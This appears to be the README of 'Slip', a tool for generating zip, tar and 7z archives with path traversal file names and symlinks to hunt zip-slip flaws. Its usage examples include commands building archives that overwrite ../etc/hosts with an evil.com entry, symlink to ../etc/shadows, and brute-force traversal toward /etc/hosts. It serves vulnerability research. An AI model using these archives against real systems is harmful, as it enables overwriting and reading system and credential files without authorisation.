# Slip

Slip is a malicious archive generator to exploit path traversal vulnerabilities.

Slip makes it easy to create multiple archives containing path traversal payloads in file name fields, rendering the extraction of the archive a potentially dangerous operation. With this approach it is possible to find and exploit "[zip-slip](https://security.snyk.io/research/zip-slip-vulnerability)" type vulnerabilities.

## Motivation

Most commonly used tools rarely support path traversal payloads in archives, this makes it hard and time consuming to create malicious archives when attempting to find vilnerabilities in a software. With slip it's really convenient to create higly customizable archives that fit most situations.

## Features

Slip is a feature rich script capable of satisfying most "zip-slip" hunting needs, in particular the script:

- Supports **zip**, **tar** and **7z** archives (and every compression algorithm supported by each format)
- Allows to hunt for both **arbitrary file write** and **arbitrary file read** vulnerabilities (using paths or symlinks)
- Supports multiple payloads of different types (paths/symlinks)
- Supports the automatic generation of path traversal payloads to look for a file at different "depths" 
- Supports the usage of custom "dotdotslash" sequences
- Implements a "massfind" mode, that uses a payload dictionary to create the archive (dictionary provided üòâ)

## Getting started

### Installation
Clone the repo, install the requirements (`pip install -r requirements.txt`) and you're good to go!

### Usage
```
Usage: slip.py [OPTIONS] ARCHIVE_NAME

  Script to generate "zipslip" and "zip symlink" archives.

  ARCHIVE-NAME is the name of the archive to be created.

Options:
  -a, --archive-type [zip|tar|7z]
                                  Type of the archive.  [default: zip]
  -c, --compression [none|deflate|bzip2|lzma|lzma2|ppmd|brotli|zstandard]
                                  Compression algorithm to use in the archive.
  -p, --paths TEXT                Comma separated paths to include in the
                                  archive.
  -s, --symlinks TEXT             Comma separated symlinks to include in the
                                  archive.
  --file-content TEXT             Content of the files in the archive, if not
                                  set a random string will be used.
  --force-name                    If set, the filename will be forced exactly
                                  as provided.
  --search INTEGER                If set, paths and symlink will generate
                                  multiple traversal paths to try and find the
                                  target file or path at different depths.
                                  [default: 0]
  --dotdotslash TEXT              Dot dot slash sequence to use in search
                                  mode.  [default: ../]
  --mass-find TEXT                Name of the file to find. It will create an
                                  archive with numerous path traversal
                                  payloads aimed to find the specified file
                                  name. WARNING: it uses A LOT of payloads,
                                  use with caution.
  --mass-find-mode [paths|symlinks]
                                  Mass-find mode to use  [default: symlinks]
  --mass-find-dict FILENAME       Mass-find payload dictionary  [default:
                                  path_traversal_dict.txt]
  --mass-find-placeholder TEXT    Mass-find placeholder for filename in
                                  dictionary  [default: {FILE}]
  -v, --verbose                   Verbosity trigger.
  --help                          Show this message and exit.
```

### Usage example

Create a tar.bz2 archive containing 2 explicit paths: 
```
python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" archive
```

Create a zip archive containing an explicit path and an explicit symlink: 
```
python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" archive
```

Create a tar.bz2 archive with 4 payloads to search for "config.ini" at 3 different depths (it also uses Windows flavor dot dot slash): 
```
python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" out
```
The archive will contain:
```
config.ini
..\config.ini
..\..\config.ini
..\..\..\config.ini
```

Create a 7z archive with an explicit path and an explicit file content:
```
python3 slip.py --archive-type 7z --compression bzip2 --paths "../etc/hosts" --file-content "127.0.0.1    evil.com" archive
```

Create a tar archive with multiple payloads (from the default mass-find dictionary) to find the `/etc/host/` file:
```
python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode symlinks archive
```
‚ö†Ô∏è WARNING: mass-find mode supports paths, this translates to a bruteforce attempt to rewrite a specific file, but it uses A LOT of payloads, so the result is unpredictable. Use with caution.
